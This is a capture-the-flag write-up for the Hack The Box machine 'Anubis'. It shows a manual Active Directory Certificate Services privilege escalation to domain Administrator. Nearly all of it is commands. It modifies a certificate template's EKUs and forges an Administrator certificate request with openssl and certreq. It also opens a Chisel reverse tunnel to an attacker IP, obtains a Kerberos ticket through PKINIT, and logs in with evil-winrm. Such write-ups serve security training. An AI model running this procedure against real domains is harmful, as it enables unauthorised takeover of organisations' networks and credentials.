# Alternative way to exploit Anubis

## Privilege Escalation

The **Certified Pre-Owned** vulnerability can be exploited manually without the automated tools.
This [blog article](https://elkement.blog/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/) explains all the steps.

Setting variable for _EKUs_ as the respective OID for SmartCard Logon:
```
$EKUs=@("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2")
```
```
Set-ADObject "CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=WINDCORP,DC=htb" -Add @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
```

Generating configuration file, key and request on Linux:
```bash
cnffile="admin.cnf"
reqfile="admin.req"
keyfile="admin.key"

dn="/DC=htb/DC=windcorp/CN=Users/CN=Administrator"

cat > $cnffile <<EOF
[ req ]
default_bits = 2048
prompt = no
req_extensions = user
distinguished_name = dn

[ dn ]
CN = Administrator

[ user ]
subjectAltName = otherName:msUPN;UTF8:administrator@windcorp.htb

EOF

openssl req -config $cnffile -subj $dn -new -nodes -sha256 -out $reqfile -keyout $keyfile
```

Uploading request file _admin.req_ to the box:
```
curl 10.10.14.3/admin.req -o admin.req
```

Finding out the name of the certificate authority with the `certutil` command:
```
Config:    "earth.windcorp.htb\windcorp-CA"
```

Creating certificate with `certreq`:
```
certreq -submit -config earth.windcorp.htb\windcorp-CA -attrib "CertificateTemplate:Web" admin.req admin.cer
```

Getting the certificate of the certificate authority:
```
certutil /ca.cert ca.cer
```

Modifying the **Kerberos configuration** _/etc/krb5.conf_ on our local client:
```
[libdefaults]
        default_realm = WINDCORP.HTB

[realms]
        WINDCORP.HTB = {
                kdc = EARTH.WINDCORP.HTB
                admin_server = EARTH.WINDCORP.HTB
                pkinit_anchors = FILE:/opt/krb/ca.cer
                pkinit_identities = FILE:/opt/krb/admin.cer,/opt/krb/admin.key
                pkinit_kdc_hostname = EARTH.WINDCORP.HTB
                pkinit_eku_checking = kpServerAuth
        }

[domain_realm]
        .windcorp.htb = WINDCORP.HTB
```

The files _admin.cer_, _admin.key_ and _ca.cer_ have to be moved to our _/opt/krb_ directory.

The port of **Kerberos** has to be forwarded, so it can be accessed from our local client.

Adding localhost to our _/etc/hosts_ file:
```
127.0.0.1       www.windcorp.htb earth earth.htb earth.windcorp.htb
```

Starting **Chisel server** to listen for incoming connections:
```
./chisel server --socks5 --reverse -p 8000
```

Executing _chisel.exe_ to forward connections:
```
chisel.exe client 10.10.14.3:8000 R:socks R:88:127.0.0.1:88
```

Creating **Kerberos ticket** for _Administrator_:
```
kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@WINDCORP.HTB
```

Using **Evil-WinRM** to authenticate to the box with the ticket:
```
proxychains evil-winrm -i earth.windcorp.htb -u administrator -r windcorp.htb
```

This will use the ticket in the Kerberos database that can be checked with `klist` and authenticate to the box as _Administrator_!
